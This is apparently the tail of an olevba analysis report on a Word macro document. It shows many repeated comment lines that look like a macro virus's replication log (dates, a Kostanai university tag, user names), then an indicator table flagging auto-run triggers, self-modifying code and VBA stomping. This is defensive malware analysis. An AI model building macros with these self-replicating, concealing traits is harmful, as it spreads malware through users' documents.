' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #811:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #812:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #813:
' 	QuoteRem 0x0000 0x0020 " 16:40:13 - ñóááîòà, 11 ìàð 2000"
' Line #814:
' 	QuoteRem 0x0000 0x0004 " ÍÈ×"
' Line #815:
' 	QuoteRem 0x0000 0x0000 ""
' Line #816:
' Line #817:
' Line #818:
' Line #819:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #820:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #821:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #822:
' 	QuoteRem 0x0000 0x0020 " 16:58:47 - ñóááîòà, 11 ìàð 2000"
' Line #823:
' 	QuoteRem 0x0000 0x0004 " ÍÈ×"
' Line #824:
' 	QuoteRem 0x0000 0x0000 ""
' Line #825:
' Line #826:
' Line #827:
' Line #828:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #829:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #830:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #831:
' 	QuoteRem 0x0000 0x0020 " 17:00:31 - ñóááîòà, 11 ìàð 2000"
' Line #832:
' 	QuoteRem 0x0000 0x0004 " ÍÈ×"
' Line #833:
' 	QuoteRem 0x0000 0x0000 ""
' Line #834:
' Line #835:
' Line #836:
' Line #837:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #838:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #839:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #840:
' 	QuoteRem 0x0000 0x0020 " 17:02:15 - ñóááîòà, 11 ìàð 2000"
' Line #841:
' 	QuoteRem 0x0000 0x0004 " ÍÈ×"
' Line #842:
' 	QuoteRem 0x0000 0x0000 ""
' Line #843:
' Line #844:
' Line #845:
' Line #846:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #847:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #848:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #849:
' 	QuoteRem 0x0000 0x0024 " 11:29:34 - âîñêðåñåíüå, 12 ìàð 2000"
' Line #850:
' 	QuoteRem 0x0000 0x0004 " ÍÈ×"
' Line #851:
' 	QuoteRem 0x0000 0x0000 ""
' Line #852:
' Line #853:
' Line #854:
' Line #855:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #856:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #857:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #858:
' 	QuoteRem 0x0000 0x0020 " 14:14:19 - ïÿòíèöà, 13 àïð 2001"
' Line #859:
' 	QuoteRem 0x0000 0x0002 " s"
' Line #860:
' 	QuoteRem 0x0000 0x0000 ""
' Line #861:
' Line #862:
' Line #863:
' Line #864:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #865:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #866:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #867:
' 	QuoteRem 0x0000 0x001F " 11:53:04 - óòîðàê, 17 àïð 2001"
' Line #868:
' 	QuoteRem 0x0000 0x0013 " Patient Of Dr.OGen"
' Line #869:
' 	QuoteRem 0x0000 0x0000 ""
' Line #870:
' Line #871:
' Line #872:
' Line #873:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #874:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #875:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #876:
' 	QuoteRem 0x0000 0x001E " 18:55:25 - ñðåäà, 25 àïð 2001"
' Line #877:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #878:
' 	QuoteRem 0x0000 0x0000 ""
' Line #879:
' Line #880:
' Line #881:
' Line #882:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #883:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #884:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #885:
' 	QuoteRem 0x0000 0x0020 " 14:16:05 - ÷åòâåðã, 26 àïð 2001"
' Line #886:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #887:
' 	QuoteRem 0x0000 0x0000 ""
' Line #888:
' Line #889:
' Line #890:
' Line #891:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #892:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #893:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #894:
' 	QuoteRem 0x0000 0x0020 " 14:39:32 - ÷åòâåðã, 26 àïð 2001"
' Line #895:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #896:
' 	QuoteRem 0x0000 0x0000 ""
' Line #897:
' Line #898:
' Line #899:
' Line #900:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #901:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #902:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #903:
' 	QuoteRem 0x0000 0x0020 " 15:36:42 - ÷åòâåðã, 26 àïð 2001"
' Line #904:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #905:
' 	QuoteRem 0x0000 0x0000 ""
' Line #906:
' Line #907:
' Line #908:
' Line #909:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #910:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #911:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #912:
' 	QuoteRem 0x0000 0x0020 " 18:58:35 - ÷åòâåðã, 26 àïð 2001"
' Line #913:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #914:
' 	QuoteRem 0x0000 0x0000 ""
' Line #915:
' Line #916:
' Line #917:
' Line #918:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #919:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #920:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #921:
' 	QuoteRem 0x0000 0x001D " 17:42:46 - ñðåäà, 2 ìàé 2001"
' Line #922:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #923:
' 	QuoteRem 0x0000 0x0000 ""
' Line #924:
' Line #925:
' Line #926:
' Line #927:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #928:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #929:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #930:
' 	QuoteRem 0x0000 0x001F " 09:29:54 - ÷åòâåðã, 3 ìàé 2001"
' Line #931:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #932:
' 	QuoteRem 0x0000 0x0000 ""
' Line #933:
' Line #934:
' Line #935:
' Line #936:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #937:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #938:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #939:
' 	QuoteRem 0x0000 0x001F " 10:46:37 - ÷åòâåðã, 3 ìàé 2001"
' Line #940:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #941:
' 	QuoteRem 0x0000 0x0000 ""
' Line #942:
' Line #943:
' Line #944:
' Line #945:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #946:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #947:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #948:
' 	QuoteRem 0x0000 0x001F " 19:21:52 - ÷åòâåðã, 3 ìàé 2001"
' Line #949:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #950:
' 	QuoteRem 0x0000 0x0000 ""
' Line #951:
' Line #952:
' Line #953:
' Line #954:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #955:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #956:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #957:
' 	QuoteRem 0x0000 0x0023 " 13:28:18 - ïîíåäåëüíèê, 7 ìàé 2001"
' Line #958:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #959:
' 	QuoteRem 0x0000 0x0000 ""
' Line #960:
' Line #961:
' Line #962:
' Line #963:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #964:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #965:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #966:
' 	QuoteRem 0x0000 0x001F " 15:11:58 - âòîðíèê, 8 ìàé 2001"
' Line #967:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #968:
' 	QuoteRem 0x0000 0x0000 ""
' Line #969:
' Line #970:
' Line #971:
' Line #972:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #973:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #974:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #975:
' 	QuoteRem 0x0000 0x0020 " 13:13:51 - ïÿòíèöà, 11 ìàé 2001"
' Line #976:
' 	QuoteRem 0x0000 0x0005 " Smok"
' Line #977:
' 	QuoteRem 0x0000 0x0000 ""
' Line #978:
' Line #979:
' Line #980:
' Line #981:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #982:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #983:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #984:
' 	QuoteRem 0x0000 0x0024 " 10:48:01 - ïîíåäåëüíèê, 14 ìàé 2001"
' Line #985:
' 	QuoteRem 0x0000 0x0005 " Smok"
' Line #986:
' 	QuoteRem 0x0000 0x0000 ""
' Line #987:
' Line #988:
' Line #989:
' Line #990:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #991:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #992:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #993:
' 	QuoteRem 0x0000 0x0024 " 12:15:10 - ïîíåäåëüíèê, 14 ìàé 2001"
' Line #994:
' 	QuoteRem 0x0000 0x0005 " Smok"
' Line #995:
' 	QuoteRem 0x0000 0x0000 ""
' Line #996:
' Line #997:
' Line #998:
' Line #999:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1000:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1001:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1002:
' 	QuoteRem 0x0000 0x0020 " 12:29:14 - ñóááîòà, 12 ìàé 2001"
' Line #1003:
' 	QuoteRem 0x0000 0x0014 " êàáèíåò èíôîðìàòèêè"
' Line #1004:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1005:
' Line #1006:
' Line #1007:
' Line #1008:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1009:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1010:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1011:
' 	QuoteRem 0x0000 0x0020 " 13:27:44 - ñóááîòà, 12 ìàé 2001"
' Line #1012:
' 	QuoteRem 0x0000 0x0014 " êàáèíåò èíôîðìàòèêè"
' Line #1013:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1014:
' Line #1015:
' Line #1016:
' Line #1017:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1018:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1019:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1020:
' 	QuoteRem 0x0000 0x0024 " 10:29:59 - âîñêðåñåíüå, 13 ìàé 2001"
' Line #1021:
' 	QuoteRem 0x0000 0x0014 " êàáèíåò èíôîðìàòèêè"
' Line #1022:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1023:
' Line #1024:
' Line #1025:
' Line #1026:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1027:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1028:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1029:
' 	QuoteRem 0x0000 0x0024 " 01:18:10 - ïîíåäåëüíèê, 14 ìàé 2001"
' Line #1030:
' 	QuoteRem 0x0000 0x0014 " êàáèíåò èíôîðìàòèêè"
' Line #1031:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1032:
' Line #1033:
' Line #1034:
' Line #1035:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1036:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1037:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1038:
' 	QuoteRem 0x0000 0x0024 " 04:15:41 - ïîíåäåëüíèê, 14 ìàé 2001"
' Line #1039:
' 	QuoteRem 0x0000 0x0014 " êàáèíåò èíôîðìàòèêè"
' Line #1040:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1041:
' Line #1042:
' Line #1043:
' Line #1044:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1045:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1046:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1047:
' 	QuoteRem 0x0000 0x0024 " 04:18:46 - ïîíåäåëüíèê, 14 ìàé 2001"
' Line #1048:
' 	QuoteRem 0x0000 0x0014 " êàáèíåò èíôîðìàòèêè"
' Line #1049:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1050:
' Line #1051:
' Line #1052:
' Line #1053:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1054:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1055:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1056:
' 	QuoteRem 0x0000 0x001E " 11:30:46 - ñðåäà, 23 ìàé 2001"
' Line #1057:
' 	QuoteRem 0x0000 0x0007 " Èíôîðì"
' Line #1058:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1059:
' Line #1060:
' Line #1061:
' Line #1062:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1063:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1064:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1065:
' 	QuoteRem 0x0000 0x0023 " 06:15:15 - ïîíåäåëüíèê, 4 èþí 2001"
' Line #1066:
' 	QuoteRem 0x0000 0x0007 " Èíôîðì"
' Line #1067:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1068:
' Line #1069:
' Line #1070:
' Line #1071:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1072:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1073:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1074:
' 	QuoteRem 0x0000 0x001F " 18:21:56 - ïÿòíèöà, 8 èþí 2001"
' Line #1075:
' 	QuoteRem 0x0000 0x0007 " Èíôîðì"
' Line #1076:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1077:
' Line #1078:
' Line #1079:
' Line #1080:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1081:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1082:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1083:
' 	QuoteRem 0x0000 0x001F " 18:54:42 - ïÿòíèöà, 8 èþí 2001"
' Line #1084:
' 	QuoteRem 0x0000 0x0007 " Èíôîðì"
' Line #1085:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1086:
' Line #1087:
' Line #1088:
' Line #1089:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1090:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1091:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1092:
' 	QuoteRem 0x0000 0x0020 " 21:05:14 - âòîðíèê, 17 èþë 2001"
' Line #1093:
' 	QuoteRem 0x0000 0x0007 " Êàéíàð"
' Line #1094:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1095:
' Line #1096:
' Line #1097:
' Line #1098:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1099:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1100:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1101:
' 	QuoteRem 0x0000 0x001E " 06:45:35 - ñðåäà, 18 èþë 2001"
' Line #1102:
' 	QuoteRem 0x0000 0x0007 " Êàéíàð"
' Line #1103:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1104:
' Line #1105:
' Line #1106:
' Line #1107:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1108:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1109:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1110:
' 	QuoteRem 0x0000 0x0020 " 19:49:23 - ïÿòíèöà, 20 èþë 2001"
' Line #1111:
' 	QuoteRem 0x0000 0x0007 " Êàéíàð"
' Line #1112:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1113:
' Line #1114:
' Line #1115:
' Line #1116:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1117:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1118:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1119:
' 	QuoteRem 0x0000 0x0020 " 01:06:21 - ïÿòíèöà, 24 àâã 2001"
' Line #1120:
' 	QuoteRem 0x0000 0x0007 " Êàéíàð"
' Line #1121:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1122:
' Line #1123:
' Line #1124:
' Line #1125:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1126:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1127:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1128:
' 	QuoteRem 0x0000 0x001E " 15:53:32 - ñðåäà, 29 àâã 2001"
' Line #1129:
' 	QuoteRem 0x0000 0x0007 " Êàéíàð"
' Line #1130:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1131:
' Line #1132:
' Line #1133:
' Line #1134:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1135:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1136:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1137:
' 	QuoteRem 0x0000 0x0023 " 10:48:58 - âîñêðåñåíüå, 2 ñåí 2001"
' Line #1138:
' 	QuoteRem 0x0000 0x0007 " Êàéíàð"
' Line #1139:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1140:
' Line #1141:
' Line #1142:
' Line #1143:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1144:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1145:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1146:
' 	QuoteRem 0x0000 0x001F " 20:51:32 - ÷åòâåðã, 6 ñåí 2001"
' Line #1147:
' 	QuoteRem 0x0000 0x0007 " Êàéíàð"
' Line #1148:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1149:
' Line #1150:
' Line #1151:
' Line #1152:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1153:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1154:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1155:
' 	QuoteRem 0x0000 0x0020 " 06:24:12 - ïÿòíèöà, 12 îêò 2001"
' Line #1156:
' 	QuoteRem 0x0000 0x0007 " Êàéíàð"
' Line #1157:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1158:
' Line #1159:
' Line #1160:
' Line #1161:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1162:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1163:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1164:
' 	QuoteRem 0x0000 0x001E " 10:21:09 - ñðåäà, 17 îêò 2001"
' Line #1165:
' 	QuoteRem 0x0000 0x0007 " Êàéíàð"
' Line #1166:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1167:
' Line #1168:
' Line #1169:
' Line #1170:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1171:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1172:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1173:
' 	QuoteRem 0x0000 0x0020 " 12:02:24 - ïÿòíèöà, 11 ÿíâ 2002"
' Line #1174:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #1175:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #1176:
' Line #1177:
' Line #1178:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1179:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1180:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1181:
' 	QuoteRem 0x0000 0x0020 " 13:30:44 - Tuesday, 12 Mar 2002"
' Line #1182:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #1183:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1184:
' Line #1185:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

